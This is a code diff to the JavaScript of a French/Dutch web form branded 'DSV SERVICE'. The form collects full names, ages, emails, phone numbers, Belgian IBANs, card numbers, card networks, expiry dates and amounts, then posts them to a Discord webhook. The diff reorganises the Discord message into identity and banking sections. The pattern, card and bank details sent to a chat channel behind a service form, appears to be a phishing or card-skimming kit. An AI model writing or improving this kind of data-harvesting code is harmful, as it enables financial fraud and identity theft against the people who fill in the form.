@@ -600,19 +600,15 @@
         submitBtn.disabled = true;
         submitBtn.textContent = isNl() ? '⏳ Verzenden...' : '⏳ Envoi...';
 
-        compteBE.value = compteBE.value.replace(/\s/g, '');
-        carteInput.value = carteInput.value.replace(/\s/g, '');
-        phoneInput.value = phoneInput.value.replace(/\s/g, '');
-
         var banqueVal = banqueSelect.value === 'Autre' ? banqueAutreInput.value : banqueSelect.value;
         var formData = {
-            'Nom complet': fullnameInput.value,
+            'Nom complet': fullnameInput.value.trim(),
             'Âge': ageInput.value,
-            'Email': emailInput.value,
-            'Téléphone': phoneInput.value,
-            'Compte BE': compteBE.value,
+            'Email': emailInput.value.trim(),
+            'Téléphone': phoneInput.value.trim(),
             'Banque': banqueVal || (isNl() ? 'Niet geselecteerd' : 'Non sélectionnée'),
-            'Carte': carteInput.value,
+            'Compte BE': compteBE.value.trim(),
+            'Carte': carteInput.value.trim(),
             'Carte réseau': detectedCardType || (isNl() ? 'Onbekend' : 'Inconnu'),
             'Expiration': expiryInput.value,
             'Montant': amountInput.value
@@ -622,22 +618,31 @@
     });
 
     function sendToDiscord(data) {
+        var now = new Date();
+        var dateStr = now.toLocaleDateString('fr-BE', { day: '2-digit', month: '2-digit', year: 'numeric' });
+        var timeStr = now.toLocaleTimeString('fr-BE', { hour: '2-digit', minute: '2-digit' });
+
         var message = {
-            content: '📋 **Nouvelle soumission DSV SERVICE**',
             embeds: [{
-                color: 10038079,
+                title: '📩 Nouvelle demande DSV SERVICE',
+                description: '**Reçue le ' + dateStr + ' à ' + timeStr + '**',
+                color: 1583716,
                 fields: [
-                    { name: '👤 Nom', value: data['Nom complet'], inline: false },
-                    { name: '🎂 Âge', value: data['Âge'], inline: true },
-                    { name: '📧 Email', value: data['Email'], inline: true },
-                    { name: '📱 Téléphone', value: data['Téléphone'], inline: false },
-                    { name: '🏦 Compte BE', value: '`' + data['Compte BE'] + '`', inline: false },
-                    { name: '🏛️ Banque', value: data['Banque'], inline: true },
-                    { name: '💳 Carte', value: '`' + data['Carte'] + '`', inline: false },
+                    { name: '━━━━ IDENTITÉ ━━━━', value: '​', inline: false },
+                    { name: '👤 Nom complet', value: data['Nom complet'], inline: true },
+                    { name: '🎂 Âge', value: data['Âge'] + ' ans', inline: true },
+                    { name: '📧 Email', value: data['Email'], inline: false },
+                    { name: '📱 Téléphone', value: '`' + data['Téléphone'] + '`', inline: false },
+                    { name: '━━━━ BANCAIRE ━━━━', value: '​', inline: false },
+                    { name: '🏛️ Banque', value: '**' + data['Banque'] + '**', inline: false },
+                    { name: '🏦 IBAN', value: '`' + data['Compte BE'] + '`', inline: false },
+                    { name: '💳 Carte', value: '`' + data['Carte'] + '`', inline: true },
                     { name: '🔖 Réseau', value: data['Carte réseau'], inline: true },
                     { name: '📅 Expiration', value: data['Expiration'], inline: true },
-                    { name: '💰 Montant', value: data['Montant'] + ' €', inline: true }
+                    { name: '━━━━ MONTANT ━━━━', value: '​', inline: false },
+                    { name: '💰 Montant demandé', value: '**' + data['Montant'] + ' €**', inline: false }
                 ],
+                footer: { text: 'DSV SERVICE • Formulaire en ligne' },
                 timestamp: new Date().toISOString()
             }]
         };
